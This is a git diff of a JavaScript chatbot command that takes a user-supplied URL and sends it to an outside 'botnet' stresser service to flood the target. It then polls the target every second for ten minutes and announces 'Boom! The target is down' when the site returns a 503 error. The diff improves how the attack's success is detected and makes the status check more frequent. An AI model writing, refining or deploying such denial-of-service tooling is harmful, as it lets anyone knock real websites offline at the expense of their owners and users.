@@ -22,9 +22,8 @@ module.exports["run"] = async ({ args, chat, font }) => {
     }
 
     const initiate = await chat.reply(thin("Preparing to attack target..."));
-
     const status_msg = "Botnet is currently busy, try again later!";
-    
+
     try {
         const response = await axios.get(`https://haji-mix-botnet.onrender.com/stresser?url=${encodeURIComponent(url)}`, {
             timeout: 30000
@@ -35,24 +34,25 @@ module.exports["run"] = async ({ args, chat, font }) => {
 
         const checkInterval = setInterval(async () => {
             try {
-                const checkStatus = await axios.get(url.match(/^(https?:\/\/[^\/]+)/)[0]);
-
-                if (checkStatus.status === 503) {
-                    chat.reply(thin("Boom! The target is down (503 Service Unavailable)."));
-                    clearInterval(checkInterval);
-                } else if (checkStatus.status === 502) {
-                    chat.reply(thin("Bad Gateway (502)."));
-                    clearInterval(checkInterval);
-                }
+                await axios.get(url.match(/^(https?:\/\/[^\/]+)/)[0]);
             } catch (err) {
+                if (err.response) {
+                    if (err.response.status === 503) {
+                        chat.reply(thin("Boom! The target is down (503 Service Unavailable)."));
+                        clearInterval(checkInterval);
+                    } else if (err.response.status === 502) {
+                        chat.reply(thin("Bad Gateway (502)."));
+                        clearInterval(checkInterval);
+                    }
+                }
             }
-        }, 5000);
+        }, 1000);
 
         setTimeout(() => {
             clearInterval(checkInterval);
             chat.reply(thin("10 minutes passed, stopping the check status for " + url));
-        }, 600000); 
-        
+        }, 600000);
+
     } catch (err) {
         if (err.code === 'ECONNABORTED') {
             chat.reply(thin(status_msg));
